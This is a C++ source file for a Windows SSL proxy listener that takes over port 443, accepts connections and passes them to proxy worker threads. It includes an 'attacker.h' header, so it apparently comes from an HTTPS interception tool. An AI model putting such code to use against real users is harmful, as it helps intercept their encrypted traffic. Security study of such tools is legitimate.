

#include <windows.h>
#include <WINSOCK2.H>

#include "sslPublic.h"
#include "sslPacket.h"
#include "SSLProxy.h"
#include "sslproxylistener.h"
#include "../utils/BaseSocket.h"
#include "../attacker.h"
#include "../Deamon.h"
#include "../HttpUtils.h"
#include "..\\include\\openssl\\ssl.h"
#include "..\\include\\openssl\\err.h"
#include "../utils/Tools.h"
#include "sslEntry.h"

//vmvare-hosted.exe Õ¼ÓÃ443¶Ë¿Ú

SSLProxyListener::SSLProxyListener() {

	mInstance = this;

	SSLProxy*sslproxy = new SSLProxy();

	SSL_library_init();
	SSL_load_error_strings();
	OpenSSL_add_all_algorithms();

	SSLPublic::freeSSLPort();

	mSock = BaseSocket::listenPort(SSL_PORT);
	if ((mSock == SOCKET_ERROR) || (mSock == INVALID_SOCKET))
	{
		char buf[1024];
		wsprintfA(buf, "[%s %d] listen:%d error\n", __FUNCTION__, __LINE__, HTTP_PORT);
		log(buf);
		MessageBoxA(0, buf, buf, MB_OK);
		exit(-1);
	}

	g_thread_params.gSSLEvent = CreateEventA(0, 0, 0, "gSSLEvent");

	g_thread_params.gSSLListenEvent = CreateEventA(0, 0, TRUE, "gSSLListenEvent");

	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)SSLProxyListener::listener, this,0, 0));

	int cnt = SSL_WORK_THREAD_CNT;
	for (int i = 0; i < cnt; i++)
	{
		CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)SSLProxy::SSL_Proxy, &g_thread_params, 0, 0));
	}
}


SSLProxyListener::~SSLProxyListener() {
	closesocket(mSock);
}

int __stdcall SSLProxyListener::listener(SSLProxyListener*instance)
{

	int ret = 0;
	while (TRUE)
	{
		__try
		{
			ret = WaitForSingleObject(g_thread_params.gSSLListenEvent, INFINITE);

			sockaddr_in saclient = { 0 };
			int iClientSockSize = sizeof(sockaddr_in);
			int sockclient = accept(instance->mSock, (sockaddr*)&saclient, &iClientSockSize);
			if ((sockclient != INVALID_SOCKET) && (sockclient > 0))
			{
				LPSSLPROXYPARAM spp = (LPSSLPROXYPARAM)new SSLPROXYPARAM;
				memset(spp, 0, sizeof(SSLPROXYPARAM));
				spp->usPort = SSL_PORT;
				spp->saToClient = saclient;
				spp->sockToClient = sockclient;
				spp->timeclient = time(0);
				spp->timeserver = spp->timeclient;

				Deamon::addSSL(spp);

				g_thread_params.gSSLProxyParam = spp;

				ret = SetEvent(g_thread_params.gSSLEvent);
			}
			else
			{
				log("%s %d error\r\n", __FUNCTION__, __LINE__);

				closesocket(instance->mSock);

				instance->mSock = BaseSocket::listenPort(SSL_PORT);
				if ((instance->mSock == SOCKET_ERROR) || (instance->mSock == INVALID_SOCKET))
				{
					log("%s %d error\r\n", __FUNCTION__, __LINE__);
					exit(-1);
				}

				SetEvent(g_thread_params.gSSLListenEvent);
			}
		}
		__except (1)
		{
			log("%s %d exception\r\n", __FUNCTION__, __LINE__);
		}
	}
	return TRUE;
}

